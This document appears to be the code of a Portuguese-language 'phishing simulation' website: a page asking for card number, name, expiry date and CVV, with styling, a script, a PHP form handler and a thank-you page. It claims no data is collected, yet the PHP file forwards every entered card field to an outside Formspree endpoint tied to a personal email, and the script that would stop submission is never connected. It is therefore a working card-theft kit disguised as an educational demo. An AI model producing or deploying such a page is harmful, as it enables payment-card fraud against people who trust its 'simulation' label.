<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Simulação de Phishing</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <header class="header">
        <div class="container">
            <h1>Simulação de Phishing</h1>
            <p>Este site é uma demonstração de como sites fraudulentos coletam dados.</p>
        </div>
    </header>

    <main class="container">
        <section class="form-section">
            <h2>Insira seus dados (simulado)</h2>
            <form id="phishingForm" action="form_redirect.php" method="POST">
                <label for="cardNumber">Número do cartão:</label>
                <input type="text" id="cardNumber" name="cardNumber" maxlength="16" placeholder="1234 5678 9012 3456" required>

                <label for="cardName">Nome no cartão:</label>
                <input type="text" id="cardName" name="cardName" placeholder="Seu nome completo" required>

                <label for="expiryDate">Data de validade:</label>
                <input type="month" id="expiryDate" name="expiryDate" required>

                <label for="cvv">CVV:</label>
                <input type="text" id="cvv" name="cvv" maxlength="3" placeholder="123" required>

                <button type="submit">Enviar</button>
            </form>
        </section>
        <section id="message" class="hidden">
            <h2>Simulação concluída</h2>
            <p>Se este fosse um site falso, seus dados estariam agora em mãos de fraudadores. Proteja-se!</p>
            <ul>
                <li>Verifique se o site tem o cadeado de segurança (SSL).</li>
                <li>Desconfie de mensagens urgentes ou promoções exageradas.</li>
                <li>Não insira dados pessoais em sites não confiáveis.</li>
            </ul>
            <button onclick="resetForm()">Tentar novamente</button>
        </section>
    </main>

    <footer class="footer">
        <div class="container">
            <p>Este site é uma simulação para fins educativos. Nenhum dado é coletado ou armazenado.</p>
        </div>
    </footer>

    <script src="script.js"></script>
</body>
</html>
styles.css
css
Copiar código
/* Reset básico */
body, h1, h2, p, ul, li {
    margin: 0;
    padding: 0;
    font-family: Arial, sans-serif;
}

body {
    line-height: 1.6;
    background-color: #f9f9f9;
    color: #333;
}

.container {
    width: 90%;
    max-width: 1200px;
    margin: 0 auto;
}

.header {
    background: #0078d7;
    color: white;
    padding: 20px 0;
    text-align: center;
}

.form-section {
    background: white;
    padding: 20px;
    margin: 20px 0;
    border-radius: 8px;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
}

.form-section h2 {
    margin-bottom: 20px;
    color: #0078d7;
}

label {
    display: block;
    margin-top: 10px;
    font-weight: bold;
}

input {
    width: 100%;
    padding: 10px;
    margin-top: 5px;
    margin-bottom: 15px;
    border: 1px solid #ccc;
    border-radius: 5px;
}

button {
    display: inline-block;
    background: #0078d7;
    color: white;
    border: none;
    padding: 10px 20px;
    font-size: 16px;
    border-radius: 5px;
    cursor: pointer;
    transition: background 0.3s;
}

button:hover {
    background: #005bb5;
}

.hidden {
    display: none;
}

.footer {
    background: #333;
    color: white;
    padding: 10px 0;
    text-align: center;
    font-size: 14px;
}
script.js
javascript
Copiar código
function handleSubmit(event) {
    event.preventDefault();

    // Ocultar formulário e mostrar mensagem de alerta
    document.querySelector('.form-section').classList.add('hidden');
    document.querySelector('#message').classList.remove('hidden');
}

function resetForm() {
    // Voltar ao formulário inicial
    document.querySelector('.form-section').classList.remove('hidden');
    document.querySelector('#message').classList.add('hidden');
    document.querySelector('#phishingForm').reset();
}
form_redirect.php
php
Copiar código
<?php
    // URL do Formspree
    $formspree_url = 'https://formspree.io/f/xvgonkvb';  // Substitua com o seu Formspree URL
    $data = array(
        'cardNumber' => $_POST['cardNumber'],
        'cardName' => $_POST['cardName'],
        'expiryDate' => $_POST['expiryDate'],
        'cvv' => $_POST['cvv'],
        '_replyto' => 'ggmartelaoliveirasouza@gmail.com'  // Seu email
    );

    // Configuração para enviar os dados via POST para o Formspree
    $options = array(
        'http' => array(
            'method'  => 'POST',
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data)
        )
    );

    $context  = stream_context_create($options);
    file_get_contents($formspree_url, false, $context);

    // Redirecionar para página de agradecimento ou mensagem
    header('Location: thank_you.html');  // Redirecionamento opcional
    exit();
?>
thank_you.html
html
Copiar código
<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Simulação Concluída</title>
</head>
<body>
    <h1>Simulação Concluída</h1>
    <p>Se este fosse um site falso, seus dados estariam agora em mãos de fraudadores. Proteja-se!</p>
    <ul>
        <li>Verifique se o site tem o cadeado de segurança (SSL).</li>
        <li>Desconfie de mensagens urgentes ou promoções exageradas.</li>
        <li>Não insira dados pessoais em sites não confiáveis.</li>
    </ul>
    <a href="index.html">Voltar para a página inicial</a>
</body>
</html>
